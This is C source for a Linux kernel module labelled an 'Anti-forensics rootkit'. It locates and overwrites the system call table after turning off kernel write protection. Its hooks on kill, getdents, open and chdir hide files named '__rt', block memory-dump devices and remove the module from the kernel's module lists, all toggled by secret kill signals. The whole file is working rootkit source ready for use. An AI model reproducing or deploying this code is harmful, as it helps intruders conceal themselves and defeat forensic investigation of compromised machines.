// ###########################################################################################################
// ###########################################################################################################

#include <asm/unistd.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>

// ###########################################################################################################
// ###########################################################################################################

// Misc strings
#define HIDE_STRING "__rt"
#define MODULE_NAME "AFkit"

// SYSCALL TABLE define and vars
#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

// SYSCALL definitions and vars
unsigned long **syscall_table;

typedef asmlinkage int (*kill_ptr)(pid_t pid, int sig);
kill_ptr orig_kill;

typedef asmlinkage int (*getdents_ptr)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
getdents_ptr orig_getdents;

typedef asmlinkage int (*getdents64_ptr)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
getdents64_ptr orig_getdents64;

typedef asmlinkage long (*open_ptr)(const char *pathname, int flag, mode_t mode);
open_ptr orig_open;

typedef asmlinkage long (*chdir_ptr)(const char *pathname);
chdir_ptr orig_chdir;

// DIRECTORY ENTRY struct
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

// COMMAND vars
static bool files_dirs_view = false;
static bool files_dirs_content = false;
static bool ram_dump_shield = false;
static bool module_hidden = false;

// Module hide vars
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

// ###########################################################################################################
// ###########################################################################################################

// Function to get syscall table and store it
static unsigned long **get_syscall_table(void){
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **syscall_t;

	while(offset < ULLONG_MAX){
		syscall_t = (unsigned long **)offset;

		if(syscall_t[__NR_close] == (unsigned long *) sys_close) return syscall_t;
		offset += sizeof(void *);
	}

	return NULL;
}

// Hide LKM Rootkit
static void hide_lkm(void){
	if(module_hidden == false){
		module_previous = THIS_MODULE->list.prev;
		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
		
		list_del(&THIS_MODULE->list);
		kobject_del(&THIS_MODULE->mkobj.kobj);
		list_del(&THIS_MODULE->mkobj.kobj.entry);

		module_hidden = true;
	}
	else return;
}

// Unhide LKM Rootkit
static void unhide_lkm(void){
	if(module_hidden == true){
		list_add(&THIS_MODULE->list, module_previous);
		kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
		module_hidden = false;
	}
	else return;
}

// Custom kill syscall.
// Used to interact with rootkit
asmlinkage int custom_kill(pid_t pid, int sig){
	// Toggle show/hide __rt files/dirs
	if((sig == 31) && (pid == 0)){
		if(files_dirs_view == false) files_dirs_view = true;
		else if(files_dirs_view == true) files_dirs_view = false;
		return 0;
	}
	// Toggle show/hide __rt files/dirs content
	else if((sig == 32) && (pid == 0)){
		if(files_dirs_content == false) files_dirs_content = true;
		else if(files_dirs_content == true) files_dirs_content = false;
		return 0;
	}
	// Toggle RAM dump shield
	else if((sig == 33) && (pid == 0)){
		if(ram_dump_shield == false) ram_dump_shield = true;
		else if(ram_dump_shield == true) ram_dump_shield = false;
		return 0;
	}
	// Hide process with given pid
	else if(sig == 34){
		return 0;
	}
	// Hide LKM Rootkit
	else if((sig == 35) && (pid == 0)){
		hide_lkm();
		return 0;
	}
	// Unhide LKM Rootkit
	else if((sig == 36) && (pid == 0)){
		unhide_lkm();
		return 0;
	}
	// Show Rootkit status in dmesg via printk
	/*
	else if((sig == 50) && (pid == 0)){
		printk(KERN_INFO "\n## STATUS ##\nHide Files/Directories from view: %d\nHide Files/Directories content: %d\nRAM shield: %d\n", files_dirs_view, files_dirs_content, ram_dump_shield);
		return 0;
	}
	*/
	else return (*orig_kill)(pid,sig);
}

// Custom chdir syscall.
// Used to avoid to chdir into __rt directories.
asmlinkage int custom_chdir(const char *pathname){
	if((strstr(pathname, HIDE_STRING) != NULL) && (files_dirs_content == true)){
		return -ENOENT;
	}
	else{
		return orig_chdir(pathname);
	}
}

// Custom getdents syscall.
// Used to avoid __rt files listing
asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent *dirp, size_t count){
	int pos;
	long ret;

	ret = orig_getdents(fd, dirp, count);
	if(ret <= 0) return ret;

	for(pos = 0; pos < ret; ){
		char *ptr = (char *)dirp + pos;
		struct linux_dirent *d = (struct linux_dirent *)ptr;

		if((strstr(d->d_name, HIDE_STRING) != NULL) && (files_dirs_view == true)){
			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
			ret -= d->d_reclen;
		}
		else{
			pos += d->d_reclen;
		}
	}

	return ret;
}

// Custom getdents64 syscall.
// Used to avoid __rt files listing
asmlinkage long custom_getdents64(unsigned int fd, struct linux_dirent64 *dirp, size_t count){
	int pos;
	long ret;

	ret = orig_getdents64(fd, dirp, count);
	if(ret <= 0) return ret;

	for(pos = 0; pos < ret; ){
		char *ptr = (char *)dirp + pos;
		struct linux_dirent64 *d = (struct linux_dirent64 *)ptr;

		if((strstr(d->d_name, HIDE_STRING) != NULL) && (files_dirs_view == true)){
			memcpy(d, (char *)d + d->d_reclen, ret - pos - d->d_reclen);
			ret -= d->d_reclen;
		}
		else{
			pos += d->d_reclen;
		}
}

return ret;
}

// Custom open syscall.
// Used to avoid __rt files content inspection and to avoid /dev/mem reading (and dumping)
asmlinkage int custom_open(const char *pathname, int flag, mode_t mode){
	if((strstr(pathname, HIDE_STRING ) != NULL) && (files_dirs_content == true)){
		return -ENOENT;
	}
	else if(((strstr(pathname, "/dev/mem" ) != NULL) || (strstr(pathname, "/dev/port" ) != NULL) || (strstr(pathname, "/dev/kmem" ) != NULL)) && (ram_dump_shield == true)){
		return -ENOENT;
	}
	else{
		return orig_open(pathname, flag, mode);
	}
}

// Function used to backup default syscalls and hook customized ones
static void hook_syscall_table(void){
	GPF_DISABLE;
	orig_kill = (kill_ptr)syscall_table[__NR_kill];
	syscall_table[__NR_kill] = (unsigned long *) custom_kill;
	orig_getdents = (getdents_ptr)syscall_table[__NR_getdents];
	syscall_table[__NR_getdents] = (unsigned long *) custom_getdents;
	orig_getdents64 = (getdents64_ptr)syscall_table[__NR_getdents64];
	syscall_table[__NR_getdents64] = (unsigned long *) custom_getdents64;
	orig_open = (open_ptr)syscall_table[__NR_open];
	syscall_table[__NR_open] = (unsigned long *) custom_open;
	orig_chdir = (chdir_ptr)syscall_table[__NR_chdir];
	syscall_table[__NR_chdir] = (unsigned long *) custom_chdir;
	GPF_ENABLE;
}

// Function used to restore default (and previusly stored) syscalls
static void restore_syscall_table(void){
	GPF_DISABLE;
	syscall_table[__NR_kill] = (unsigned long *) orig_kill;
	syscall_table[__NR_getdents] = (unsigned long *) orig_getdents;
	syscall_table[__NR_getdents64] = (unsigned long *) orig_getdents64;
	syscall_table[__NR_open] = (unsigned long *) orig_open;
	syscall_table[__NR_chdir] = (unsigned long *) orig_chdir;
	GPF_ENABLE;
} 

// ###########################################################################################################
// ###########################################################################################################

// Init function
static int rootkit_init(void){
	if(!(syscall_table = get_syscall_table())) return -1;
	hook_syscall_table();

	return 0;
}

// Exit function
static void rootkit_exit(void){
	restore_syscall_table();

}

// ###########################################################################################################
// ###########################################################################################################

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Anti-forensics rootkit");
MODULE_AUTHOR("T0t3m");

// ###########################################################################################################
// ###########################################################################################################